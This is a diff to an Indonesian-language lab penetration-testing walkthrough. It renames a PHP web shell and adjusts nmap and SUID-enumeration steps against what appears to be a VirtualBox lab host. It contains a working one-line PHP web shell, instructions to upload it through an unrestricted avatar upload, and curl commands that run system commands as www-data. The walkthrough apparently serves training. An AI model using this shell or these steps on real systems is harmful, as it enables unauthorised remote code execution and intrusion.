@@ -101,7 +101,7 @@ Menentukan service yang berjalan pada port aplikasi dan memperoleh informasi awa
 ### Command
 
 ```bash
-nmap -Pn -sC -sV -p8080 "$TARGET"
+nmap -sC -sV -p- "$TARGET"
 ```
 
 ### Output yang Diharapkan
@@ -403,7 +403,7 @@ Cari fitur upload avatar atau upload file.
 ### Buat File
 
 ```bash
-cat > cakgup1.php <<'EOF'
+cat > cakgup.php <<'EOF'
 <?php system($_GET['cmd']); ?>
 EOF
 ```
@@ -415,7 +415,7 @@ Kode PHP membaca parameter `cmd`, lalu menjalankannya melalui fungsi `system()`.
 Contoh request:
 
 ```text
-/uploads/cakgup1.php?cmd=id
+/uploads/cakgup.php?cmd=id
 ```
 
 Setara dengan menjalankan:
@@ -430,7 +430,7 @@ pada server target.
 
 ## 14. Fase 11 — Upload Web Shell
 
-Upload `cakgup1.php` melalui fitur pada `/profile`.
+Upload `cakgup.php` melalui fitur pada `/profile`.
 
 ### Hal yang Perlu Diamati
 
@@ -468,7 +468,7 @@ Membuktikan bahwa file PHP yang berhasil diunggah tidak hanya dapat diakses, tet
 ### Validasi Awal
 
 ```bash
-curl "http://192.168.56.128:8080/uploads/cakgup1.php?cmd=id"
+curl "http://192.168.56.128:8080/uploads/cakgup.php?cmd=id"
 ```
 
 ### Evidence
@@ -481,7 +481,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Output `id` membuktikan bahwa:
 
-- file `cakgup1.php` berhasil disimpan pada direktori `/uploads`;
+- file `cakgup.php` berhasil disimpan pada direktori `/uploads`;
 - file dapat diakses secara langsung melalui HTTP;
 - web server memproses file tersebut sebagai script PHP;
 - parameter `cmd` diteruskan ke sistem operasi; dan
@@ -494,7 +494,7 @@ Dengan demikian, temuan telah berkembang dari **unrestricted file upload** menja
 Agar command berikutnya lebih ringkas, URL web shell disimpan dalam variabel:
 
 ```bash
-TARGET="http://192.168.56.128:8080/uploads/cakgup1.php"
+TARGET="http://192.168.56.128:8080/uploads/cakgup.php"
 ```
 
 ---
@@ -562,18 +562,6 @@ curl -sG "$TARGET" \
 ### Evidence
 
 ```text
-/snap/core20/2866/usr/bin/chfn
-/snap/core20/2866/usr/bin/chsh
-/snap/core20/2866/usr/bin/gpasswd
-/snap/core20/2866/usr/bin/mount
-/snap/core20/2866/usr/bin/newgrp
-/snap/core20/2866/usr/bin/passwd
-/snap/core20/2866/usr/bin/su
-/snap/core20/2866/usr/bin/sudo
-/snap/core20/2866/usr/bin/umount
-/snap/core20/2866/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/2866/usr/lib/openssh/ssh-keysign
-/snap/snapd/21759/usr/lib/snapd/snap-confine
 /usr/local/bin/env
 /usr/bin/su
 /usr/bin/pkexec
@@ -587,9 +575,7 @@ curl -sG "$TARGET" \
 /usr/bin/mount
 /usr/bin/umount
 /usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/libexec/polkit-agent-helper-1
-/opt/VBoxGuestAdditions-7.2.4/bin/VBoxDRMClient
+
 ```
 
 ### Temuan Utama
